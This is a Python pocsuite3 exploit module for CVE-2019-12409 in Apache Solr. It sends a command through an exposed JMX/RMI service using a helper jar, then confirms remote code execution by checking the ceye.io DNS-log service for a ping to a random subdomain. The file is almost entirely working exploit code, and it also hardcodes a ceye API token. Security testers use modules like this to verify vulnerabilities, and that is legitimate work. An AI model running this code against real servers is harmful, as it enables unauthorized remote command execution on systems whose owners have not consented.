#!/usr/bin/env python
#coding=utf-8

import random
import json
import time
import subprocess
import signal
import os
import sys
import base64
import re
from string import ascii_letters

# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

# 需要ysoserial.jar包
# 需要jython-standalone-2.7.1.jar，mjet.py


'''
CVE-2019-12409
'''
class Solr_RCE_12409(POCBase):
    vulID = 'solr-CVE-2019-12409'
    appName = 'Solr'
    appVersion = 'Linux版的Solr 8.1.1和8.2.0版本'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-11-19'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-02-18'  # 编写 PoC 的日期
    updateDate = '2020-04-09'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/co5NdHgjPbgVUu1-hzR4gA']  # 漏洞地址来源,0day不用写
    name = 'Solr JMX RCE'  # PoC 名称
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)


    def _verify(self):
        result={}

        vul_url = self.url
        target_url = vul_url

        host, port = url2ip(target_url, True)
        
        #payload = "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
        payload = "'ping {0}.{1}'".format(self.BANNER, self.DOMAIN)
        #payload = "id & cmd.exe /c echo '{0}'".format(self.BANNER)

        command = "java -jar ./data/jmxrmi_1.7.jar {0} {1} {2}".format(host, port, payload)
        print(command)

        pro1 = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
     
        output = pro1.stdout.read().decode()

        #print(output)

        time.sleep(2) # 休眠2s等待ceye生成记录

        #if self.test_command(output):
        if self.test_dnslog(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            result['VerifyInfo']['Payload'] = payload
            return self.save_output(result)
        return self.save_output(result)


    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            sub_domain = d['data'][0]['domain']
            if self.BANNER in sub_domain:
                return True
        except Exception:
            return False           


    def test_command(self, p_output):
        # 分别对应echo命令（Windows）的回显和id命令（*nix）的回显
        return re.search(self.BANNER, p_output) or "uid=" in p_output


    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


# 注册类
register_poc(Solr_RCE_12409)
